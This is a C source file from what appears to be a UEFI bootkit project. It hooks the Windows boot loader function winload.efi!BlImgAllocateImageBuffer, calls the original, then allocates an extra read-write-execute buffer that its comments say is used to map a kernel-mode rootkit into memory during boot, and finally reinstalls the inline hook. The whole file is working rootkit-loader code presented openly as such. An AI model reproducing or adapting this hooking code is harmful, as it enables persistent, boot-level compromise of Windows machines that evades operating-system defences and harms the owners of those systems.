// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Hooks winload.efi!BlImgAllocateImageBuffer
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiRuntimeServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Runtime Services Table. This library does not contain any functions or macros. It simply exports the global variable gRT that is a pointer to the EFI Runtime Services Table as defined in the UEFI Specification. The global variable gRT must be preinitialized to NULL. The library constructor must set gRT to point at the EFI Runtime Services Table so it is available at the module's entry point. Since there is overhead in initializing this global variable, only those modules that actually require access to the EFI Runtime Services Table should use this library. Only available to DXE and UEFI module types.
#include <Library/UefiRuntimeServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils01Strings.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils04Headers.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils11KernelModeDriverMapper.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Hooks/Hooks02WinloadEfi2BlImgAllocateImageBuffer.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures00ArcSystemFirmware.h>
#include <Modules/Module1_BootWindows0_Hookings/Payloads/Payloads00KernelModeDriver.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Hooks the BlImgAllocateImageBuffer function.
	@details        This function replaces the original BlImgAllocateImageBuffer function with a custom hook that allows for additional functionality.


	@param[out]     ImageBuffer                 A pointer to a pointer that will receive the address of the allocated image buffer.
	@param[in]      ImageSize                   The size of the image buffer to be allocated, in bytes.
	@param[in]      MemoryType                  The type of memory to allocate for the image buffer (e.g., EfiBootServicesData).
	@param[in]      Attributes                  Attributes to set for the allocated memory buffer (e.g., EFI_MEMORY_RO).
	@param[in]      Unused                      A pointer reserved for future use, currently not used by this function.
	@param[in]      Flags                       Flags that may affect the allocation behavior (e.g., alignment constraints).


	@retval         EFI_SUCCESS                 The image buffer was successfully allocated and initialized.
	@retval         EFI_OUT_OF_RESOURCES        There was not enough memory available to allocate the image buffer.
	@retval         EFI_INVALID_PARAMETER       One or more input parameters are invalid.
	@retval         EFI_ABORTED                 The image buffer allocation process was aborted due to an internal error.
**/
EFI_STATUS
BootWindowsHookings_HooksWinloadEfi_BlImgAllocateImageBuffer(
	OUT             VOID**                      ImageBuffer,
	IN              UINTN                       ImageSize,
	IN              UINT32                      MemoryType,
	IN              UINT32                      Attributes,
	IN              VOID*                       Unused,
	IN              UINT32                      Flags
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello


	// ---------------------------------------------------------------------------------------------------------------------
	// Restore original function bytes that were replaced with hook
	BootWindowsHookings_UtilsMemory_CopyMemory((VOID*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer, Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferBackupBytes, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));


	// ---------------------------------------------------------------------------------------------------------------------
	// Call original
	EFI_STATUS Status = ((t_BlImgAllocateImageBuffer)Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer)(ImageBuffer, ImageSize, MemoryType, Attributes, Unused, Flags);


	// ---------------------------------------------------------------------------------------------------------------------
	// Allocate a separate memory buffer if certain conditions are met (If the allocation was successful and the memory type is BL_MEMORY_TYPE_APPLICATION, allocate an additional RWX buffer (used later for rootkit mapping).
	if (!EFI_ERROR(Status) && MemoryType == MACRO_BOOTWINDOWSHOOKINGS_HOOKSWINLOADEFI_BLIMGALLOCATEIMAGEBUFFER_BL_MEMORY_TYPE_APPLICATION)
	{
		// -----------------------------------------------------------------------------------------------------------------
		// Allocate an additional RWX memory region using the original BlImgAllocateImageBuffer, and store the allocation status and buffer address in a structure. This memory is used later to map a kernel-mode rootkit directly into memory during the boot process.
		Global_BootWindowsHookings_UtilsKernelModeDriverMapper_MappedKernelModeDriverState.AllocatedBufferStatus = ((t_BlImgAllocateImageBuffer)Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer)(&Global_BootWindowsHookings_UtilsKernelModeDriverMapper_MappedKernelModeDriverState.AllocatedBuffer, MACRO_BOOTWINDOWSHOOKINGS_PAYLOADSKERNELMODEDRIVER_KERNELMODEDRIVERHELLOTHREADING_IMAGE_SIZE, MemoryType, MACRO_BOOTWINDOWSHOOKINGS_HOOKSWINLOADEFI_BLIMGALLOCATEIMAGEBUFFER_BL_MEMORY_ATTRIBUTE_RWX, Unused, 0);


		// -----------------------------------------------------------------------------------------------------------------
		// If allocation fails, mark buffer as NULL
		if (EFI_ERROR(Global_BootWindowsHookings_UtilsKernelModeDriverMapper_MappedKernelModeDriverState.AllocatedBufferStatus))
		{
			Global_BootWindowsHookings_UtilsKernelModeDriverMapper_MappedKernelModeDriverState.AllocatedBuffer = NULL;
		}

		// -----------------------------------------------------------------------------------------------------------------
		// Do not rehook the function, leave it clean (This is intentional to avoid re-entry or infinite hooking)
		// gBS->Stall(20*1000000);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Reinstall the hook if the special condition was not met (Re-apply the hook by writing back the hook template and patching the jump address)
	BootWindowsHookings_UtilsMemory_CopyMemory((VOID*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer, Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));
	BootWindowsHookings_UtilsMemory_CopyMemory((UINT8*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer + Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplateAddressOffset, (UINTN*)&Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferHookAddress, sizeof(Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferHookAddress));


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return Status;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
